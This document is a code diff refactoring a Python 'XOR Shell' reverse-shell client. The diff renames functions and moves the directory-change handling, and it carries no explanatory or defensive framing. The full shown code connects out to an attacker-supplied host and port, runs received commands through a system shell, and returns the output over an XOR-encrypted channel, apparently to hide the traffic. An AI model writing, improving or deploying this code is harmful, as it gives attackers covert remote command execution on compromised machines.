@@ -9,7 +9,7 @@ import argparse
 from socket import socket, AF_INET, SOCK_STREAM
 from Crypto.Cipher import XOR
 
-parser = argparse.ArgumentParser(description='XOR Shell - Client')
+parser = argparse.ArgumentParser(description='XOR Shell - Connector')
 parser.add_argument('-a','--host', help='set lhost', required=True)
 parser.add_argument('-p','--port', help='set lport', required=True)
 parser.add_argument('-k','--key', help='set XOR key', required=True)
@@ -19,36 +19,34 @@ myHOST = args['host']
 myPORT = int(args['port'])
 key = args['key']
 
-def encrypter(cleardata):
+def encrypt(cleardata):
     data = XOR.XORCipher(key)
     return data.encrypt(cleardata)
 
-def decrypter(cleardata):
+def decrypt(cleardata):
     data = XOR.XORCipher(key)
     return data.decrypt(cleardata)
 
-def client():
+def main():
     sockobj = socket(AF_INET, SOCK_STREAM)
     sockobj.connect((myHOST, myPORT))
 
     while True:
         output = ''
-        data = (decrypter(sockobj.recv(1024))).decode('cp866')
-        if data[:2] == 'cd':
-            try:
-                os.chdir(data[3:])
-            except:
-                output += 'enter cd error'
-
+        data = (decrypt(sockobj.recv(1024))).decode('cp866')
         if len(data) > 0:
+            if data[:2] == 'cd':
+                try:
+                    os.chdir(data[3:])
+                except:
+                    output += 'enter cd error'
+
             cmd = subprocess.Popen(data[:], shell=True,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 stdin=subprocess.PIPE)
             output = (cmd.stdout.read() + cmd.stderr.read()).decode('cp866')
-            sockobj.send(encrypter(output + (os.getcwd() + '> ')))
-
-    sockobj.close()
+            sockobj.send(encrypt(output + (os.getcwd() + '> ')))
 
 if __name__ == "__main__":
-    client()
+    main()
